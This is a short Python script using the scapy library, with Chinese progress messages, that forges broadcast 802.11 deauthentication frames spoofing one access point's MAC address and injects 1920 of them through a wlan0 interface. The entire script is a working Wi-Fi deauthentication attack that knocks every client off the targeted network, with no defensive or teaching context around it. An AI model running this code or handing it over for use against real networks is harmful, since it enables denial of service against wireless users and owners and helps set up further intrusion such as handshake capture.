from scapy.all import *
print('导入库')
d=RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2='1c:ff:59:33:7f:ff',addr3='1c:ff:59:33:7f:ff',type=0,subtype=12)/Dot11Deauth(reason=7)
print('已定义RadioTap头(802.11帧注入和接收的事实标准)和Deauth广播报文\nAP的MAC地址:\t1c:ff:59:33:7f:ff\n类型:管理帧\n原因代码:从非关联STA接受的3类帧.\n')
for s in range(0,1920):
    for _ in range(1):
        p=d.copy()
        print('已拷贝帧')
        p[Dot11].SC=(s<<4)
        print('已将序列号控制右移4位')
        sendp(p,iface='wlan0',inter=0,verbose=False,count=1)
        print('接口:wlan0.发送间隔:0秒.详细输出:假.数量:一')
        
